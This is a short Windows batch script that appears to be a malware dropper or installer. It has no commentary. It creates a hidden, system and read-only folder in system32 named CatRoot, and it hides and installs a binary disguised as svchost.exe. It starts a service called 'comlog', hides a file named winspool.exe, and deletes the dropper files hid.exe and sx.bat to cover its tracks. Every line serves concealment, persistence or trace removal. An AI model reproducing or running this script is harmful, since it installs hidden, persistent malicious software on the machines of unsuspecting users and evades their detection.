@ECHO off
mkdir %systemroot%\system32\CatRoot
attrib +a +h +r +s %systemroot%\system32\CatRoot
cd %systemroot%\system32\CatRoot\
attrib +a +h +r +s svchost.exe
svchost.exe /i
net start comlog
attrib +s +h winspool.exe
del hid.exe /Q
del sx.bat /Q
